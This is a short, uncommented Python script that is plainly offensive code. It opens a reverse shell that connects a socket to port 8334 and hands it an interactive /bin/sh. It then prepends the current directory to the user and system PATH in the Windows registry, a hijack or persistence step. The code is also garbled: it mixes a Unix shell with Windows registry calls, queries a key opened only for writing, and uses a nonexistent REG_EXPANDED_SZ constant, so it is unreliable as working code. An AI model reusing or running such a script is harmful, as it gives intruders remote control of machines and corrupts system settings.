import socket
import subprocess
import os
import winreg

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8334))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/sh", "-i"])

targetdir = os.getcwd()

for hive, path in [
    (winreg.HKEY_CURRENT_USER, "Environment"),
    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Session Manager\Environment")
]:
    reg = winreg.ConnectRegistry(None, hive)
    key = winreg.OpenKey(reg, path, 0, winreg.KEY_SET_VALUE)
    current_path = winreg.QueryValueEx(key, "Path")[0]
    if targetdir not in current_path:
        new_path = targetdir + ";" + current_path
        winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPANDED_SZ, new_path)
